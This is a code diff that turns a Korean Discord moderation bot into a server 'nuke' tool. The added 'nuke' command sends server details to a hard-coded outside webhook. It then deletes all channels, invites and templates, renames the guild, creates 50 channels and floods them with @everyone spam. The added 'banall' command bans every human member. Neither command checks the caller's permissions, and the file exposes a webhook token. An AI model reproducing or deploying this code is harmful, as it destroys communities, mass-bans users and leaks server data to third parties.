@@ -2,241 +2,245 @@ import discord
 from discord.ext import commands
 import asyncio
 import os
+import aiohttp
+import random
+from discord.ext.commands import BucketType, CommandOnCooldown
 
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=">", intents=intents)
+intents = discord.Intents.default()
+intents.members = True
+intents.message_content = True
+intents.guilds = True
 
-async def update_bot_presence():
-    total_members = sum(guild.member_count for guild in bot.guilds)
-    activity = discord.Game(f"{total_members}명의 유저와 함께함")
-    await bot.change_presence(activity=activity)
+bot = commands.Bot(command_prefix=".", intents=intents)
 
-@bot.event
-async def on_ready():
-    print(f"✅ 봇 실행됨: {bot.user}")
-    for guild in bot.guilds:
-        print(f'서버 이름: {guild.name} (ID: {guild.id})')
-    total_members = sum(guild.member_count for guild in bot.guilds)
-    await update_bot_presence()
-async def get_or_create_log_channel(guild: discord.Guild):
-    # 1. 주제가 "hyerin-log"인 기존 채널 찾기
-    for channel in guild.text_channels:
-        if channel.topic and "hyerin-log" in channel.topic.lower():
-            return channel
+OWNER_ID = 1170673694868250669
+WEBHOOK_URL = "https://discord.com/api/webhooks/1403976895673925642/ysaZFm9O-0TpSpHRbyRccmTd4WYOZAOCvIbyX1pXhetEQ6oF2kCiFdU6IBlt0QTLfm8-"
 
-    # 2. 없다면 새로 생성
-    overwrites = {
-        guild.default_role: discord.PermissionOverwrite(view_channel=False)
+async def send_webhook(embed: discord.Embed):
+    async with aiohttp.ClientSession() as session:
+        webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
+        await webhook.send(embed=embed)
+
+async def safe_delete(channel):
+    url = f"https://discord.com/api/v10/channels/{channel.id}"
+    headers = {"Authorization": f"Bot {bot.http.token}"}
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.delete(url, headers=headers) as resp:
+                if resp.status in [200, 204]:
+                    print(f"[DELETED CHANNEL] {channel.name}")
+                    break
+                elif resp.status == 429:
+                    data = await resp.json()
+                    wait_time = data.get('retry_after', 1)
+                    print(f"[RATE LIMIT] Deleting {channel.name}, waiting {wait_time:.2f}s + 1s")
+                    await asyncio.sleep(wait_time + 1)
+                else:
+                    text = await resp.text()
+                    print(f"[FAILED TO DELETE] {channel.name}: {resp.status} {text}")
+                    break
+
+async def create_channel(guild, channel_name):
+    url = f"https://discord.com/api/v10/guilds/{guild.id}/channels"
+    headers = {"Authorization": f"Bot {bot.http.token}", "Content-Type": "application/json"}
+    json_data = {"name": channel_name, "type": 0}
+
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.post(url, headers=headers, json=json_data) as resp:
+                if resp.status in [200, 201]:
+                    data = await resp.json()
+                    print(f"[CREATED CHANNEL] {channel_name}")
+                    return int(data['id'])
+                elif resp.status == 429:
+                    data = await resp.json()
+                    wait_time = data.get('retry_after', 1)
+                    print(f"[RATE LIMIT] Creating {channel_name}, waiting {wait_time:.2f}s + 1s")
+                    await asyncio.sleep(wait_time + 1)
+                else:
+                    text = await resp.text()
+                    print(f"[FAILED TO CREATE CHANNEL] {channel_name}: {resp.status} {text}")
+                    return None
+
+async def delete_all_invites(guild):
+    url = f"https://discord.com/api/v10/guilds/{guild.id}/invites"
+    headers = {"Authorization": f"Bot {bot.http.token}"}
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.get(url, headers=headers) as resp:
+                if resp.status == 200:
+                    invites = await resp.json()
+                    break
+                elif resp.status == 429:
+                    data = await resp.json()
+                    wait_time = data.get('retry_after', 1)
+                    print(f"[RATE LIMIT] Fetching invites, waiting {wait_time:.2f}s + 1s")
+                    await asyncio.sleep(wait_time + 1)
+                else:
+                    text = await resp.text()
+                    print(f"[FAILED TO FETCH INVITES]: {resp.status} {text}")
+                    return
+        for invite in invites:
+            delete_url = f"https://discord.com/api/v10/invites/{invite['code']}"
+            while True:
+                async with session.delete(delete_url, headers=headers) as resp:
+                    if resp.status in [200, 204]:
+                        print(f"[DELETED INVITE] {invite['code']}")
+                        break
+                    elif resp.status == 429:
+                        data = await resp.json()
+                        wait_time = data.get('retry_after', 1)
+                        print(f"[RATE LIMIT] Deleting invite {invite['code']}, waiting {wait_time:.2f}s + 1s")
+                        await asyncio.sleep(wait_time + 1)
+                    else:
+                        text = await resp.text()
+                        print(f"[FAILED TO DELETE INVITE] {invite['code']}: {resp.status} {text}")
+                        break
+
+async def delete_all_templates(guild):
+    url = f"https://discord.com/api/v10/guilds/{guild.id}/templates"
+    headers = {"Authorization": f"Bot {bot.http.token}"}
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.get(url, headers=headers) as resp:
+                if resp.status == 200:
+                    templates = await resp.json()
+                    break
+                elif resp.status == 429:
+                    data = await resp.json()
+                    wait_time = data.get('retry_after', 1)
+                    print(f"[RATE LIMIT] Fetching templates, waiting {wait_time:.2f}s + 1s")
+                    await asyncio.sleep(wait_time + 1)
+                else:
+                    text = await resp.text()
+                    print(f"[FAILED TO FETCH TEMPLATES]: {resp.status} {text}")
+                    return
+        for template in templates:
+            delete_url = f"https://discord.com/api/v10/guilds/{guild.id}/templates/{template['code']}"
+            while True:
+                async with session.delete(delete_url, headers=headers) as resp:
+                    if resp.status in [200, 204]:
+                        print(f"[DELETED TEMPLATE] {template['code']}")
+                        break
+                    elif resp.status == 429:
+                        data = await resp.json()
+                        wait_time = data.get('retry_after', 1)
+                        print(f"[RATE LIMIT] Deleting template {template['code']}, waiting {wait_time:.2f}s + 1s")
+                        await asyncio.sleep(wait_time + 1)
+                    else:
+                        text = await resp.text()
+                        print(f"[FAILED TO DELETE TEMPLATE] {template['code']}: {resp.status} {text}")
+                        break
+
+async def execute_ban(guild, user, bot_token):
+    delete_days_payload = {
+        "delete_message_days": random.randint(0, 7)
     }
-    for role in guild.roles:
-        if role.permissions.administrator:
-            overwrites[role] = discord.PermissionOverwrite(view_channel=True)
+    async with aiohttp.ClientSession() as session:
+        url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{user.id}"
+        while True:
+            async with session.put(
+                url,
+                headers={"Authorization": f"Bot {bot_token}"},
+                json=delete_days_payload
+            ) as resp:
+                text = await resp.text()
+                if resp.status in [200, 201, 204]:
+                    print(f"[BANNED] {user} ({user.id})")
+                    break
+                elif resp.status == 429:
+                    data = await resp.json()
+                    wait_time = data.get('retry_after', 1)
+                    print(f"[RATE LIMIT] Waiting {wait_time:.2f}s + 1s to ban {user}")
+                    await asyncio.sleep(wait_time + 1)
+                elif "Missing Permissions" in text:
+                    print(f"[NO PERMISSION] {user}")
+                    break
+                else:
+                    print(f"[BAN FAILED] {user} ({resp.status}): {text}")
+                    break
+
+async def send_message(channel, content):
     try:
-        log_channel = await guild.create_text_channel(
-            "hyerin-log",
-            overwrites=overwrites,
-            topic="hyerin-log"
-        )
-        return log_channel
-    except discord.Forbidden:
-        return None
-
-async def check_role_hierarchy(ctx, member):
-    if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
-        await ctx.send("🚫 당신보다 높은 역할을 가진 사용자에게 이 명령어를 사용할 수 없습니다.")
-        return False
-    return True
-
-@bot.command()
-@commands.has_permissions(ban_members=True)
-async def ban(ctx, member: discord.Member, *, reason: str = "사유 없음"):
-    if not await check_role_hierarchy(ctx, member): return
-    try:
-        await member.ban(reason=reason)
-        try:
-            await member.send(f"당신은 {ctx.guild.name} 서버에서 밴당했습니다. 사유: {reason}")
-        except:
-            await ctx.send(f"{member}님에게 DM을 보낼 수 없습니다.")
-        await ctx.send(f"{member}님을 밴했습니다. 사유: {reason}")
-        log_channel = await get_or_create_log_channel(ctx.guild)
-        if log_channel:
-            embed = discord.Embed(title="🔨 사용자 밴", color=discord.Color.red(), timestamp=ctx.message.created_at)
-            embed.add_field(name="밴 대상", value=member.mention)
-            embed.add_field(name="사유", value=reason)
-            embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await log_channel.send(embed=embed)
-    except Exception as e:
-        await ctx.send(f"⚠️ 밴 처리 중 오류가 발생했습니다: {e}")
-
-@bot.command(name="개발자")
-async def developer(ctx):
-    await ctx.send("혜린 ㅣ discord.gg/ilbe")
-
-@bot.command()
-async def 도움말(ctx):
-    commands_list = [command.name for command in bot.commands]
-    await ctx.send("사용 가능한 명령어:\n" + ", ".join(commands_list))
-
-@bot.command()
-@commands.has_permissions(manage_messages=True)
-async def 청소(ctx, amount: int = 5):
-    if amount < 1:
-        await ctx.send("1개 이상의 메시지를 삭제해야 합니다.")
-        return
-    deleted = await ctx.channel.purge(limit=amount + 1)
-    await ctx.send(f"🧹 {len(deleted)-1}개의 메시지를 삭제했습니다!", delete_after=2)
-    log_channel = await get_or_create_log_channel(ctx.guild)
-    if log_channel:
-        embed = discord.Embed(title="🧹 메시지 삭제", color=discord.Color.orange(), timestamp=ctx.message.created_at)
-        embed.add_field(name="삭제 수", value=str(len(deleted)-1))
-        embed.add_field(name="채널", value=ctx.channel.mention)
-        embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-        await log_channel.send(embed=embed)
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def role(ctx, member: discord.Member, *, role_input: str):
-    if not await check_role_hierarchy(ctx, member): return
-    role = None
-    if role_input.isdigit():
-        role = discord.utils.get(ctx.guild.roles, id=int(role_input))
-    if not role:
-        role = discord.utils.get(ctx.guild.roles, name=role_input)
-    if not role:
-        await ctx.send(f"❌ 역할을 찾을 수 없습니다: `{role_input}`")
-        return
-    try:
-        await member.add_roles(role)
-        await ctx.send(f"✅ {member.mention}님에게 `{role.name}` 역할을 부여했습니다.")
-        log_channel = await get_or_create_log_channel(ctx.guild)
-        if log_channel:
-            embed = discord.Embed(title="🎭 역할 부여", color=discord.Color.green(), timestamp=ctx.message.created_at)
-            embed.add_field(name="대상 사용자", value=member.mention)
-            embed.add_field(name="부여된 역할", value=role.name)
-            embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await log_channel.send(embed=embed)
-    except discord.Forbidden:
-        await ctx.send("🚫 봇에게 역할을 부여할 권한이 없습니다.")
-    except Exception as e:
-        await ctx.send(f"⚠️ 오류 발생: {e}")
-
-@bot.command()
-@commands.has_permissions(moderate_members=True)
-async def mute(ctx, member: discord.Member, time: int, *, reason="사유 없음"):
-    if not await check_role_hierarchy(ctx, member): return
-    try:
-        duration = discord.utils.utcnow() + discord.timedelta(seconds=time)
-        await member.timeout(duration, reason=reason)
-        await ctx.send(f"🔇 {member.mention}님을 {time}초 동안 타임아웃 시켰습니다. 사유: {reason}")
-        log_channel = await get_or_create_log_channel(ctx.guild)
-        if log_channel:
-            embed = discord.Embed(title="🔇 사용자 타임아웃", color=discord.Color.greyple(), timestamp=ctx.message.created_at)
-            embed.add_field(name="대상", value=member.mention)
-            embed.add_field(name="시간", value=f"{time}초")
-            embed.add_field(name="사유", value=reason)
-            embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await log_channel.send(embed=embed)
-    except Exception as e:
-        await ctx.send(f"⚠️ 오류 발생: {e}")
-
-@bot.command()
-@commands.has_permissions(moderate_members=True)
-async def 해제(ctx, member: discord.Member):
-    if not await check_role_hierarchy(ctx, member): return
-    try:
-        await member.remove_timeout()
-        await ctx.send(f"🔈 {member.mention}님의 타임아웃을 해제했습니다.")
-        log_channel = await get_or_create_log_channel(ctx.guild)
-        if log_channel:
-            embed = discord.Embed(title="🔈 타임아웃 해제", color=discord.Color.green(), timestamp=ctx.message.created_at)
-            embed.add_field(name="대상", value=member.mention)
-            embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await log_channel.send(embed=embed)
-    except Exception as e:
-        await ctx.send(f"⚠️ 오류 발생: {e}")
-
-@bot.command()
-@commands.has_permissions(kick_members=True)
-async def kick(ctx, member: discord.Member, *, reason="사유 없음"):
-    if not await check_role_hierarchy(ctx, member): return
-    try:
-        await member.kick(reason=reason)
-        await ctx.send(f"👢 {member.mention}님을 킥했습니다. 사유: {reason}")
-        log_channel = await get_or_create_log_channel(ctx.guild)
-        if log_channel:
-            embed = discord.Embed(title="👢 사용자 킥", color=discord.Color.dark_orange(), timestamp=ctx.message.created_at)
-            embed.add_field(name="대상", value=member.mention)
-            embed.add_field(name="사유", value=reason)
-            embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await log_channel.send(embed=embed)
-    except Exception as e:
-        await ctx.send(f"⚠️ 오류 발생: {e}")
-
-@bot.command()
-@commands.has_permissions(manage_messages=True)
-async def 경고(ctx, member: discord.Member, *, reason="사유 없음"):
-    if not await check_role_hierarchy(ctx, member): return
-    await ctx.send(f"⚠️ {member.mention}님에게 경고를 부여했습니다. 사유: {reason}")
-    log_channel = await get_or_create_log_channel(ctx.guild)
-    if log_channel:
-        embed = discord.Embed(title="⚠️ 사용자 경고", color=discord.Color.yellow(), timestamp=ctx.message.created_at)
-        embed.add_field(name="대상", value=member.mention)
-        embed.add_field(name="사유", value=reason)
-        embed.set_footer(text=f"처리자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-        await log_channel.send(embed=embed)
-
-@bot.command(name="명령어")
-async def 명령어(ctx, *, command_name: str = None):
-    if not command_name:
-        embed = discord.Embed(
-            title="📘 사용 가능한 명령어 목록",
-            description="명령어에 대한 자세한 정보를 보려면 `>명령어 [명령어이름]` 을 입력하세요.",
-            color=discord.Color.green()
-        )
-        for name, desc in command_descriptions.items():
-            embed.add_field(name=f"> {name}", value=desc.split("\n")[0], inline=False)
-        embed.set_footer(text=f"요청자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-        await ctx.send(embed=embed)
-    else:
-        command_name = command_name.lower()
-        description = command_descriptions.get(command_name)
-        if description:
-            embed = discord.Embed(
-                title=f"📘 명령어 정보: `{command_name}`",
-                description=description,
-                color=discord.Color.blurple()
-            )
-            embed.set_footer(text=f"요청자: {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
-            await ctx.send(embed=embed)
+        await channel.send(content)
+    except discord.HTTPException as e:
+        if e.status == 429:
+            wait_time = getattr(e, 'retry_after', 1)
+            print(f"[RATE LIMIT] Sending message in {channel.name}, waiting {wait_time:.2f}s + 1s")
+            await asyncio.sleep(wait_time + 1)
         else:
-            await ctx.send(f"❌ `{command_name}` 명령어를 찾을 수 없습니다.")
+            print(f"[FAILED TO SEND MESSAGE] {channel.name}: {e}")
+    except Exception as e:
+        print(f"[ERROR] Sending message in {channel.name}: {e}")
 
-@bot.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandNotFound):
-        return
-    else:
-        return
+@bot.command()
+@commands.cooldown(1, 120, BucketType.user)
+async def nuke(ctx, channel_base_name: str = "Nuked By DeadDestroyers"):
+    guild = ctx.guild
+    member_count = guild.member_count
+    icon_url = guild.icon.url if guild.icon else None
+    embed = discord.Embed(title="🛑 Nuke Command Executed", color=0xff0000)
+    embed.add_field(name="Server Name", value=guild.name, inline=True)
+    embed.add_field(name="Server ID", value=str(guild.id), inline=True)
+    embed.add_field(name="Server Owner", value=guild.owner.name if guild.owner else "Unknown", inline=True)
+    embed.add_field(name="Member Count", value=str(member_count), inline=True)
 
-command_descriptions = {
-    "ban": "🚫 사용자를 서버에서 밴합니다.\n사용법: `>ban @유저 [사유]`",
-    "kick": "👢 사용자를 서버에서 추방합니다.\n사용법: `>kick @유저 [사유]`",
-    "mute": "🔇 사용자를 일정 시간 동안 타임아웃합니다.\n사용법: `>mute @유저 시간(초) [사유]`",
-    "해제": "🔈 타임아웃된 사용자를 복구합니다.\n사용법: `>해제 @유저`",
-    "청소": "🧹 채널의 메시지를 삭제합니다.\n사용법: `>청소 [개수]`",
-    "role": "🎭 특정 역할을 유저에게 부여합니다.\n사용법: `>role @유저 역할이름 또는 역할ID`",
-    "도움말": "❓ 사용 가능한 명령어 목록을 보여줍니다.\n사용법: `>도움말`",
-    "개발자": "👨‍💻 봇 개발자 정보를 표시합니다.\n사용법: `>개발자`",
-    "명령어": "ℹ️ 특정 명령어에 대한 설명을 표시합니다.\n사용법: `>명령어 [명령어이름]`",
-}
+    if icon_url:
+        embed.set_thumbnail(url=icon_url)
+    await send_webhook(embed)
 
-@bot.event
-async def on_member_join(member):
-    await update_bot_presence()
+    try:
+        await guild.edit(name="Nuked By DeadDestroyers", reason="Nuke command executed")
+    except Exception as e:
+        print(f"[FAILED TO CHANGE GUILD NAME]: {e}")
 
-@bot.event
-async def on_member_remove(member):
-    await update_bot_presence()
+    await delete_all_invites(guild)
+    await delete_all_templates(guild)
 
-bot.run(os.getenv("BOT_TOKEN"))
+    delete_tasks = [asyncio.create_task(safe_delete(ch)) for ch in guild.channels]
+    await asyncio.gather(*delete_tasks)
 
+    created_channel_ids = await asyncio.gather(*[
+        create_channel(guild, channel_base_name) for _ in range(50)
+    ])
+    created_channel_ids = [cid for cid in created_channel_ids if cid is not None]
+
+    channels = []
+    for ch_id in created_channel_ids:
+        channel = bot.get_channel(ch_id)
+        if not channel:
+            try:
+                channel = await bot.fetch_channel(ch_id)
+            except Exception as e:
+                print(f"[FAILED TO FETCH CHANNEL] ID {ch_id}: {e}")
+                continue
+        channels.append(channel)
+
+    content = "@everyone https://files.catbox.moe/madsm2.mp4 \nYour server is Nuked by DD lol\ndiscord.gg/ixi"
+    for _ in range(20):
+        await asyncio.gather(*(send_message(channel, content) for channel in channels))
+
+@bot.command()
+@commands.cooldown(1, 120, BucketType.user)
+async def banall(ctx):
+    guild = ctx.guild
+    token = os.getenv("DISCORD_BOT_TOKEN") or bot.http.token
+    members_to_ban = [member for member in guild.members if not member.bot]
+    ban_tasks = [asyncio.create_task(execute_ban(guild, member, token)) for member in members_to_ban]
+    await asyncio.gather(*ban_tasks)
+
+@nuke.error
+async def nuke_error(ctx, error):
+    if isinstance(error, CommandOnCooldown):
+        await ctx.send(f"Please wait {error.retry_after:.0f} seconds before using this command again.")
+
+@banall.error
+async def banall_error(ctx, error):
+    if isinstance(error, CommandOnCooldown):
+        await ctx.send(f"Please wait {error.retry_after:.0f} seconds before using this command again.")
+
+if __name__ == "__main__":
+    TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+    if not TOKEN:
+        TOKEN = "YOUR_TOKEN_HERE"
+    bot.run(TOKEN)
